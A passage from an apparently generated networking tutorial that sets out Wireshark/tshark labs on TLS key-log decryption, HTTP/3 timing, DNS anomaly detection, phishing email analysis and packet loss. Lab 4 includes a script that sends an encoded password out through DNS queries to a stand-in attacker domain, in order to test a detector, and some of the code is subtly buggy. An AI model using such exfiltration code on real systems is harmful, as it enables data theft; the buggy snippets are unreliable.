                   stats['UDP'] += 1
                   if p[UDP].dport == 53 or p[UDP].sport == 53:
                       stats['DNS'] += 1
               if IP in p:
                   stats['IP'] += 1
       
       print("=" * 60)
       print("Session Summary")
       print("=" * 60)
       for key, value in sorted(stats.items()):
           print(f"{key:>15}: {value}")
       print("=" * 60)
   
   if __name__ == "__main__":
       if len(sys.argv) != 2:
           print(f"Usage: {sys.argv[0]} <pcap_file>")
           sys.exit(1)
       summarize(sys.argv[1])
   ```

---

### Lab 2: Decrypt HTTPS Traffic

**The Target**: Decrypt TLS traffic using session keys.

**The Implementation**:

1. **Set up TLS key logging**:
   ```bash
   # Set environment variable for browsers
   export SSLKEYLOGFILE=~/tls_keys.log
   
   # Launch Chrome with key logging
   google-chrome --ssl-key-log-file=~/tls_keys.log
   
   # Or Firefox (set in about:config)
   # Set security.ssl.enable_ocsp_stapling = false
   # Set security.tls.enable_0rtt_data = false
   ```

2. **Start Wireshark** and set the key log file:
   - Edit -> Preferences -> Protocols -> TLS
   - "(Pre)-Master-Secret log filename"
   - Select `~/tls_keys.log`

3. **Capture HTTPS traffic**:
   ```bash
   sudo tcpdump -i eth0 "tcp port 443" -vv -w https_traffic.pcap
   ```

4. **Browse HTTPS websites**:
   - Go to `https://www.google.com`
   - Go to `https://www.github.com`
   - Go to `https://www.stackoverflow.com`

5. **Analyze decrypted traffic**:
   ```bash
   # In Wireshark, you should now see decrypted HTTP/2 traffic
   # You can follow TLS streams and see plaintext
   
   # Command-line: tshark with key log file
   tshark -r https_traffic.pcap -o tls.keylog_file:~/tls_keys.log \
          -Y "http2" -T fields -e http2.headers
   ```

6. **Extract decrypted data**:
   ```python
   #!/usr/bin/env python3
   """
   decrypt_tls.py - Decrypt TLS with key log
   """
   
   import subprocess
   import sys
   import os
   
   def decrypt_capture(pcap_file, keylog_file, output_file):
       """Decrypt TLS capture using tshark"""
       cmd = [
           'tshark',
           '-r', pcap_file,
           '-o', f'tls.keylog_file:{keylog_file}',
           '-T', 'fields',
           '-e', 'frame.time',
           '-e', 'ip.src',
           '-e', 'ip.dst',
           '-e', 'tcp.srcport',
           '-e', 'tcp.dstport',
           '-e', 'http.request.method',
           '-e', 'http.request.uri',
           '-e', 'http.response.code',
           '-e', 'tls.handshake.certificate',
       ]
       
       result = subprocess.run(cmd, capture_output=True, text=True)
       
       with open(output_file, 'w') as f:
           f.write(result.stdout)
       
       print(f"Decrypted output written to {output_file}")
   
   if __name__ == "__main__":
       if len(sys.argv) != 4:
           print("Usage: decrypt_tls.py <pcap> <keylog> <output>")
           sys.exit(1)
       decrypt_capture(sys.argv[1], sys.argv[2], sys.argv[3])
   ```

---

### Lab 3: Compare HTTP/2 and HTTP/3 Performance

**The Target**: Compare performance between HTTP/2 and HTTP/3.

**The Implementation**:

1. **Install tools for HTTP/3 testing**:
   ```bash
   # Install curl with HTTP/3 support
   sudo apt-get install libnghttp3-dev
   # Build curl from source with HTTP/3 support
   # Or use a pre-built version
   
   # Alternative: Use qlog visualization tools
   ```

2. **Test HTTP/2 performance**:
   ```bash
   # HTTP/2 to a supported site
   curl --http2 -I https://www.google.com
   
   # Measure load time
   curl --http2 -o /dev/null -s -w "HTTP/2: %{time_total}s\n" https://www.google.com
   
   # Multiple requests
   for i in {1..10}; do
       curl --http2 -o /dev/null -s -w "HTTP/2: %{time_total}s\n" https://www.google.com
   done
   ```

3. **Test HTTP/3 performance** (if available):
   ```bash
   # HTTP/3 to a supported site
   curl --http3 -I https://www.google.com
   
   # Measure load time
   curl --http3 -o /dev/null -s -w "HTTP/3: %{time_total}s\n" https://www.google.com
   ```

4. **Create a performance comparison script**:
   ```python
   #!/usr/bin/env python3
   """
   http_comparison.py - Compare HTTP/2 and HTTP/3 performance
   """
   
   import subprocess
   import time
   import json
   import sys
   
   def test_url(url, http_version='2'):
       """Test a URL with specified HTTP version"""
       times = []
       
       for i in range(5):
           if http_version == '2':
               cmd = ['curl', '--http2', '-o', '/dev/null', '-s', '-w', '%{time_total}', url]
           elif http_version == '3':
               cmd = ['curl', '--http3', '-o', '/dev/null', '-s', '-w', '%{time_total}', url]
           else:
               cmd = ['curl', '-o', '/dev/null', '-s', '-w', '%{time_total}', url]
           
           result = subprocess.run(cmd, capture_output=True, text=True)
           try:
               times.append(float(result.stdout.strip()))
           except ValueError:
               continue
           time.sleep(0.5)
       
       if times:
           return {
               'min': min(times),
               'max': max(times),
               'avg': sum(times) / len(times),
               'count': len(times)
           }
       return None
   
   def main():
       urls = [
           'https://www.google.com',
           'https://www.github.com',
           'https://www.stackoverflow.com'
       ]
       
       results = {}
       
       for url in urls:
           print(f"Testing {url}...")
           results[url] = {
               'http2': test_url(url, '2'),
               'http3': test_url(url, '3')
           }
       
       print("\n" + "=" * 60)
       print("Performance Comparison (seconds)")
       print("=" * 60)
       
       for url, data in results.items():
           print(f"\n{url}")
           if data['http2']:
               print(f"  HTTP/2: {data['http2']['avg']:.3f}s (min: {data['http2']['min']:.3f}s)")
           else:
               print("  HTTP/2: Not supported or failed")
           
           if data['http3']:
               print(f"  HTTP/3: {data['http3']['avg']:.3f}s (min: {data['http3']['min']:.3f}s)")
           else:
               print("  HTTP/3: Not supported or failed")
   
   if __name__ == "__main__":
       main()
   ```

---

### Lab 4: Analyze Malicious DNS Traffic

**The Target**: Detect DNS anomalies and possible exfiltration.

**The Implementation**:

1. **Capture DNS traffic**:
   ```bash
   sudo tcpdump -i eth0 "udp port 53" -vv -w dns_malicious.pcap
   ```

2. **Generate test malicious DNS traffic**:
   ```python
   #!/usr/bin/env python3
   """
   dns_exfiltration_sim.py - Simulate DNS data exfiltration
   """
   
   import socket
   import base64
   import sys
   
   def simulate_exfiltration(dns_server='8.8.8.8'):
       """Simulate DNS-based data exfiltration"""
       
       # Data to exfiltrate (encoded in subdomain)
       data = "secret_password_12345"
       encoded = base64.b64encode(data.encode()).decode()
       
       # Split into chunks for DNS queries
       chunk_size = 10
       chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
       
       # Domain to exfiltrate to (attacker-controlled)
       exfil_domain = "evil-attacker.com"
       
       print(f"Simulating DNS exfiltration of: {data}")
       print(f"Encoded: {encoded}")
       print(f"Chunks: {len(chunks)}")
       
       for i, chunk in enumerate(chunks):
           # Query format: chunk{i}.data.evil-attacker.com
           query = f"{chunk}.chunk{i}.{exfil_domain}"
           print(f"Query {i}: {query}")
           
           # Send DNS query
           try:
               socket.gethostbyname(query)
           except socket.gaierror:
               pass  # Normal for non-existent domains
           
           time.sleep(0.1)
   
   import time
   
   if __name__ == "__main__":
       simulate_exfiltration()
   ```

3. **Analyze for anomalies**:
   ```bash
   # Show all DNS queries
   tshark -r dns_malicious.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name
   
   # Show long subdomain queries (potential exfiltration)
   tshark -r dns_malicious.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name \
          | awk 'length($0) > 50'
   
   # Show NXDOMAIN responses (non-existent domains)
   tshark -r dns_malicious.pcap -Y "dns.flags.rcode == 3"
   
   # Show TXT record requests (potential data exfiltration)
   tshark -r dns_malicious.pcap -Y "dns.qry.type == 16"
   ```

4. **Python-based DNS anomaly detector**:
   ```python
   #!/usr/bin/env python3
   """
   dns_anomaly_detector.py - Detect DNS anomalies
   """
   
   import sys
   from scapy.all import rdpcap, DNS, IP
   from collections import defaultdict
   import re
   
   def detect_anomalies(filename):
       packets = rdpcap(filename)
       
       queries = defaultdict(int)
       long_queries = []
       nxdomain = []
       suspicious_tlds = []
       
       for p in packets:
           if DNS in p:
               dns = p[DNS]
               if dns.qr == 0:  # Query
                   if dns.qd:
                       qname = dns.qd.qname.decode().lower()
                       queries[qname] += 1
                       
                       # Long queries (potential exfiltration)
                       if len(qname) > 50:
                           long_queries.append(qname)
                       
                       # Suspicious TLDs (common for malware)
                       for tld in ['.tk', '.top', '.xyz', '.info', '.cc']:
                           if qname.endswith(tld):
                               suspicious_tlds.append(qname)
                               
               elif dns.qr == 1:  # Response
                   if dns.rcode == 3:  # NXDOMAIN
                       if dns.qd:
                           nxdomain.append(dns.qd.qname.decode().lower())
       
       print("=" * 60)
       print("DNS Anomaly Detection Results")
       print("=" * 60)
       
       print(f"\n1. Total unique queries: {len(queries)}")
       
       print(f"\n2. Suspicious Long Queries ({len(long_queries)}):")
       for q in long_queries[:10]:
           print(f"   - {q[:50]}...")
       
       print(f"\n3. NXDOMAIN Responses ({len(nxdomain)}):")
       for q in nxdomain[:10]:
           print(f"   - {q}")
       
       print(f"\n4. Suspicious TLD Queries ({len(suspicious_tlds)}):")
       for q in suspicious_tlds[:10]:
           print(f"   - {q}")
       
       print("\n" + "=" * 60)
       
       # Risk assessment
       risk_level = "LOW"
       if len(long_queries) > 10:
           risk_level = "HIGH"
       elif len(long_queries) > 5:
           risk_level = "MEDIUM"
       
       if len(suspicious_tlds) > 20:
           risk_level = "HIGH"
       
       print(f"Risk Level: {risk_level}")
       
       if risk_level == "HIGH":
           print("⚠️  Potential DNS exfiltration or malware communication detected!")
   
   if __name__ == "__main__":
       if len(sys.argv) != 2:
           print(f"Usage: {sys.argv[0]} <pcap_file>")
           sys.exit(1)
       detect_anomalies(sys.argv[1])
   ```

---

### Lab 5: Investigate an SMTP Phishing Email

**The Target**: Analyze an email conversation to detect phishing.

**The Implementation**:

1. **Generate a simulated phishing email**:
   ```bash
   # Use a local SMTP server or send a test email
   # The email should contain:
   # - Suspicious sender domain
   # - Urgent language (account expiring, password reset)
   # - Suspicious links
   # - Attachment (if possible)
   ```

2. **Capture SMTP traffic**:
   ```bash
   sudo tcpdump -i eth0 "tcp port 25 or tcp port 587" -vv -w phishing.pcap
   ```

3. **Analyze the email headers**:
   ```bash
   # Extract SMTP data
   tshark -r phishing.pcap -Y "smtp.data" -T fields -e data
   
   # Show the conversation
   tshark -r phishing.pcap -z follow,tcp,hex,0
   ```

4. **Python-based email header analyzer**:
   ```python
   #!/usr/bin/env python3
   """
   email_analyzer.py - Analyze email for phishing indicators
   """
   
   import sys
   import re
   from scapy.all import rdpcap, TCP, Raw
   
   def analyze_email(filename):
       packets = rdpcap(filename)
       
       # Extract email data
       email_data = b''
       for p in packets:
           if TCP in p and Raw in p:
               payload = p[Raw].load
               if b'Subject:' in payload or b'From:' in payload:
                   email_data += payload
       
       if not email_data:
           print("No email data found")
           return
       
       email_text = email_data.decode('utf-8', errors='ignore')
       
       # Extract headers
       headers = {}
       for line in email_text.split('\n'):
           if ': ' in line:
               key, value = line.split(': ', 1)
               headers[key.lower()] = value
       
       print("=" * 60)
       print("Email Analysis")
       print("=" * 60)
       
       # Check for phishing indicators
       warnings = []
       
       # 1. Check sender domain
       sender = headers.get('from', 'Unknown')
       suspicious_domains = ['gmail.com.co', 'paypa1.com', 'amaz0n.com', 
                            'microsoft-security.com', 'bankofamerica-verify.com']
       
       for domain in suspicious_domains:
           if domain in sender.lower():
               warnings.append(f"Suspicious sender domain: {sender}")
       
       # 2. Check subject
       subject = headers.get('subject', '')
       urgent_keywords = ['urgent', 'immediate', 'account expir', 'password reset', 
                         'security alert', 'verify your account']
       
       for keyword in urgent_keywords:
           if keyword in subject.lower():
               warnings.append(f"Urgent language in subject: {subject}")
       
       # 3. Check for suspicious links
       links = re.findall(r'http[s]?://[^\s<>"]+', email_text)
       suspicious_links = []
       for link in links:
           if 'paypal' in link.lower() or 'bank' in link.lower():
               suspicious_links.append(link)
       
       if suspicious_links:
           warnings.append(f"Suspicious links found: {suspicious_links}")
       
       # 4. Check for attachments
       if 'attachment' in email_text.lower() or 'filename=' in email_text.lower():
           warnings.append("Email contains attachments")
       
       # 5. Check for mismatched reply-to
       if 'reply-to' in headers:
           reply_to = headers['reply-to']
           if reply_to != sender:
               warnings.append(f"Mismatched Reply-To: {reply_to} vs {sender}")
       
       print("\nHeaders:")
       for key, value in list(headers.items())[:10]:
           print(f"  {key}: {value}")
       
       print(f"\nWarnings ({len(warnings)}):")
       for warning in warnings:
           print(f"  ⚠️  {warning}")
       
       if warnings:
           print("\n⚠️  This email exhibits characteristics of a phishing attempt!")
           print("   Do not click on any links or open attachments.")
       else:
           print("\n✓ No obvious phishing indicators detected.")
       
       print("=" * 60)
   
   if __name__ == "__main__":
       if len(sys.argv) != 2:
           print(f"Usage: {sys.argv[0]} <pcap_file>")
           sys.exit(1)
       analyze_email(sys.argv[1])
   ```

---

### Lab 6: Diagnose Packet Loss

**The Target**: Diagnose and quantify packet loss in a network.

**The Implementation**:

1. **Simulate packet loss**:
   ```bash
   # Add packet loss using iptables
   sudo iptables -A INPUT -m statistic --mode random --probability 0.05 -j DROP
   sudo iptables -A OUTPUT -m statistic --mode random --probability 0.05 -j DROP
   ```

2. **Capture traffic**:
   ```bash
   sudo tcpdump -i eth0 -vv -w loss_test.pcap
   ```

3. **Generate test traffic**:
   ```bash
   # Ping test
   ping -c 100 -i 0.2 8.8.8.8
   
   # Traffic test
   curl -o /dev/null https://www.google.com
   ```

4. **Analyze packet loss**:
   ```bash
   # Count retransmissions
   tshark -r loss_test.pcap -Y "tcp.analysis.retransmission" | wc -l
   
   # Show retransmission rate
   tshark -r loss_test.pcap -z io,stat,0,"tcp.analysis.retransmission"
   
   # Show duplicate ACKs
   tshark -r loss_test.pcap -Y "tcp.analysis.duplicate_ack"
   ```

5. **Python-based loss analyzer**:
   ```python
   #!/usr/bin/env python3
   """
   packet_loss_analyzer.py - Analyze packet loss in a capture
   """
   
   import sys
   from scapy.all import rdpcap, TCP, IP
   from collections import defaultdict
   
   def analyze_loss(filename):
       packets = rdpcap(filename)
       
       retransmissions = 0
       dup_acks = 0
       out_of_order = 0
       
       # Track sequence numbers per connection
       seq_tracker = defaultdict(list)
       
       for p in packets:
           if TCP in p:
               tcp = p[TCP]
               conn_key = f"{p[IP].src}:{tcp.sport}->{p[IP].dst}:{tcp.dport}"
               
               # Detect retransmissions (simplified)
               seq_tracker[conn_key].append(tcp.seq)
               
               # Duplicate ACKs (simplified)
               if tcp.flags & 0x10:  # ACK flag
                   # If we see the same ACK repeated
                   pass
       
       print("=" * 60)
       print("Packet Loss Analysis")
       print("=" * 60)
       
       print(f"Total packets analyzed: {len(packets)}")
       print(f"TCP packets: {sum(1 for p in packets if TCP in p)}")
       
       # Check for ICMP errors
       icmp_errors = [p for p in packets if 'ICMP' in p and hasattr(p, 'type') 
                     and p.type in [3, 11]]  # Destination Unreachable, TTL Exceeded
       
       print(f"ICMP error messages: {len(icmp_errors)}")
       
       # Check for zero window
       zero_window = [p for p in packets if TCP in p and p[TCP].window == 0]
       print(f"Zero window events: {len(zero_window)}")
       
       print("\n" + "=" * 60)
       
       # Recommendations
       print("\nRecommendations:")
       if len(zero_window) > 0:
           print("  • Zero window events detected: Receiver is overwhelmed")
           print("  • Consider reducing send rate or increasing receiver buffer")
       
       if len(icmp_errors) > 0:
           print("  • ICMP errors detected: Check network path for issues")
       
       print("\n" + "=" * 60)
   
   if __name__ == "__main__":
       if len(sys.argv) != 2:
           print(f"Usage: {sys.argv[0]} <pcap_file>")
           sys.exit(1)
       analyze_loss(sys.argv[1])
   ```

6. **Clean up**:
   ```bash
   sudo iptables -D INPUT -m statistic --mode random --probability 0.05 -j DROP
   sudo iptables -D OUTPUT -m statistic --mode random --probability 0.05 -j DROP
   ```

---

## Section 7: Reference: TLS, QUIC, and Wireshark Reference

### TLS 1.3 Cipher Suites

| Cipher Suite | Key Exchange | Encryption | Hash |
|--------------|--------------|------------|------|
| TLS_AES_128_GCM_SHA256 | ECDHE | AES-128-GCM | SHA-256 |
| TLS_AES_256_GCM_SHA384 | ECDHE | AES-256-GCM | SHA-384 |
| TLS_CHACHA20_POLY1305_SHA256 | ECDHE | ChaCha20-Poly1305 | SHA-256 |
| TLS_AES_128_CCM_SHA256 | ECDHE | AES-128-CCM | SHA-256 |
| TLS_AES_128_CCM_8_SHA256 | ECDHE | AES-128-CCM-8 | SHA-256 |

### TLS Handshake Messages (1.3)

| Message | Sender | Purpose |
|---------|--------|---------|
| ClientHello | Client | Start handshake, offer ciphers, key share |
| ServerHello | Server | Select cipher, provide key share |
| EncryptedExtensions | Server | Additional parameters (ALPN, etc.) |
| Certificate | Server | Server certificate chain |
| CertificateVerify | Server | Signature over handshake |
| Finished | Both | Verify handshake messages |
| NewSessionTicket | Server | Session resumption token |

### QUIC Frame Types

| Frame Type | Purpose |
|------------|---------|
| STREAM | Application data stream |
| ACK | Acknowledgment of received packets |
| CRYPTO | TLS handshake data |
| PING | Keep-alive/probe |
| RESET_STREAM | Abrupt stream termination |
| STOP_SENDING | Request to stop sending |
| NEW_CONNECTION_ID | Add alternative connection ID |
| RETIRE_CONNECTION_ID | Remove connection ID |
| PATH_CHALLENGE | Path validation |
| PATH_RESPONSE | Path validation response |

### Wireshark Display Filters Reference

| Filter | Purpose |
|--------|---------|
| `tcp.flags.syn == 1` | TCP SYN packets |
| `tcp.flags.fin == 1` | TCP FIN packets |
| `tcp.analysis.retransmission` | Retransmitted segments |
| `tcp.analysis.duplicate_ack` | Duplicate ACKs |
| `tls.handshake.type == 1` | ClientHello messages |
| `http.request.method == "GET"` | HTTP GET requests |
| `dns.flags.response == 0` | DNS queries |
| `quic` | QUIC traffic |
| `ip.addr == 192.168.1.1` | Traffic to/from IP |
| `not arp and not icmp` | Exclude ARP and ICMP |

---

## Summary

In Part 5, we've explored modern web security and packet analysis:

1. **Cryptography Fundamentals**: The building blocks of secure communication - symmetric encryption, asymmetric encryption, hashing, and digital signatures.

2. **TLS 1.3**: The latest encryption protocol with perfect forward secrecy, 0-RTT resumption, and faster handshakes.

3. **HTTP/3 and QUIC**: The next-generation protocol built on UDP, eliminating head-of-line blocking and enabling connection migration.

4. **Packet Analysis**: Professional Wireshark techniques for diagnosing network issues.

5. **Network Troubleshooting**: Systematic approaches to common problems.

**Key Takeaways**:
- TLS provides encryption, authentication, and integrity
- HTTP/3 with QUIC significantly improves performance
- Packet analysis reveals the inner workings of network traffic
- Systematic troubleshooting identifies and resolves issues
- Security protocols continue to evolve to address new threats

**Series Completion**: You now have a comprehensive understanding of network protocols from the physical medium to modern secure web communication. You can:
- Analyze network traffic like a professional
- Build network applications using sockets
- Troubleshoot complex networking issues
- Implement secure communications
- Understand the complete TCP/IP stack

---

**[GENERATED: Part 5 — Modern Web Security & Packet Analysis]**

---

## 🎉 SERIES COMPLETE 🎉

**Congratulations!** You've completed the entire multipart tutorial series:

- ✅ **Part 0**: Introduction and Overview
- ✅ **Part 1**: Foundations & the Local Link (Ethernet, ARP, DHCP)
- ✅ **Part 2**: The Network Layer & Diagnostics (IPv4, IPv6, Routing, ICMP)
- ✅ **Part 3**: The Transport Layer (TCP, UDP, Socket Programming)
- ✅ **Part 4**: The Application Layer (DNS, HTTP, Email, SNMP)
- ✅ **Part 5**: Modern Web Security & Packet Analysis (TLS, HTTP/3, QUIC, Forensics)

**What You've Built**:
- Complete mental model of the network stack
- Packet capture and analysis skills
- Network applications using sockets
- Security and encryption understanding
- Troubleshooting expertise

**Next Steps**:
1. Practice with real-world packet captures
2. Build your own network applications
3. Explore advanced topics (NFV, SDN, network automation)
4. Consider pursuing networking certifications
5. Contribute to open-source networking projects

**Thank you for joining this journey through the depths of network protocols!**
